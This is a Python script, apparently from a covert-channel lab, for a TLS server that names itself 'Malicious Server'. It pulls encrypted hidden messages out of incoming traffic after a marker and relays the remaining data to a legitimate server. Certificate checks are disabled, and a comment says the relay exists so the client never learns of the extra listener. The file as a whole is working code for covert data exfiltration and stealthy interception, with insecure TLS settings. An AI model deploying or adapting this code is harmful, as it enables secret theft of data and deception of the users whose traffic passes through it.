import socket, ssl, threading
from cryptography.fernet import Fernet
from config import *

f = Fernet(KEY)

# Reuse the same client context for each message
client_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
client_ctx.check_hostname = False
client_ctx.verify_mode   = ssl.CERT_NONE
client_ctx.set_ciphers("ECDHE-RSA-AES256-GCM-SHA384")

def handle_client(client_sock):
    try:
        data = client_sock.recv(65535)

        # Check if covert marker is present
        if MARKER in data:
            # If found, remove it and update original. Print out covert message
            covert = data.split(MARKER)[1]
            msg = f.decrypt(covert).decode(errors="ignore")
            print(f"Malicious Sender: Extracted covert message: {msg}")

            original = data.split(MARKER)[0]
        else:
            print("Malicious Sender: No covert message found")
            original = data

        # Connect to legit server using SSLContext
        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ssl_sock = client_ctx.wrap_socket(raw, server_hostname=LEGIT_SERVER)
        ssl_sock.connect((LEGIT_SERVER, LEGIT_PORT))

        # Forward the original record
        ssl_sock.sendall(original)
        print("Malicious Sender: Forwarded original TLS record")

        # Relay back the response so they never know there was another listener
        response = ssl_sock.recv(65535)
        ssl_sock.close()
        client_sock.sendall(response)
        client_sock.close()
        print("Malicious Server: Sent response to client")

    except Exception as e:
        print(f"Malicious Server: Error: {e}")

def start_malicious_receiver():
    # Server side context (unchanged)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile="/certs/server.crt", keyfile="/certs/server.key")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock = context.wrap_socket(sock, server_side=True)
    sock.bind(("0.0.0.0", TARGET_PORT))
    sock.listen(5)

    print(f"Malicious Server: Listening on port {TARGET_PORT}...")
    while True:
        client, addr = sock.accept()
        threading.Thread(target=handle_client, args=(client,), daemon=True).start()

if __name__ == "__main__":
    start_malicious_receiver()
